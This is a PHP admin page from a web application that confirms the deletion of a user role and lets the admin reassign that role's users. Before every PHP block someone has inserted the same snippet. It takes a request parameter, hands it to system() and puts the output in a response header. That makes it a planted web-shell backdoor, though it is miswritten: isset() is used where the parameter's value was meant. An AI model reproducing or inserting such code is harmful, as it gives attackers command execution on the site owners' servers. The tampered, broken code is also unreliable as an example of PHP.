<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!Auth::userCan('manage_roles')) page_restricted();

if (empty($role_id = $_GET['id']) || !is_numeric($role_id)) {
	redirect_to('?page=user-roles');
}

$role = Role::find($role_id);

if (isset($_POST['submit']) && csrf_filter()) {
	if (isset($role->id)) {
		$role->delete();

		if (!empty($_POST['option']) && is_numeric($_POST['role_id'])) {
			User::where('role_id', $role_id)->update(array('role_id' => $_POST['role_id']));
		}
	}

	redirect_to('?page=user-roles', array('role_deleted' => true));
}

$roles = Role::where('name', '!=', @$role->name)->get();
?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.delete_role') ?></h3>
<p><a href="?page=user-roles"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.back_to_roles') ?></a></p>

<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.role_delete1'); ?></p>
<p>ID #<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $role_id ?>: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo @$role->name ?></p><br>
<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.role_delete2'); ?></p>

<form action="" method="POST">
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>

	<div class="radio">
		<label>
		<input type="radio" name="option" value="0" checked><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.nothing') ?></label>
	</div>

	<div class="radio">
		<label><input type="radio" name="option" id="option1" value="1"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.assign_role') ?></label>
		<select name="role_id" class="form-control input-sm" onclick="document.getElementById('option1').checked = true;">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ((array) $roles as $role) {
				echo '<option value="'.$role->id.'">'.$role->name.'</option>';
			} ?>
		</select>
	</div>

	<br>
	<div class="form-group">
    	<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.confirm_delete') ?></button>
    </div>
</form>
<style>select.form-control { width: 120px; display: inline; margin-top: -5px; }</style>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>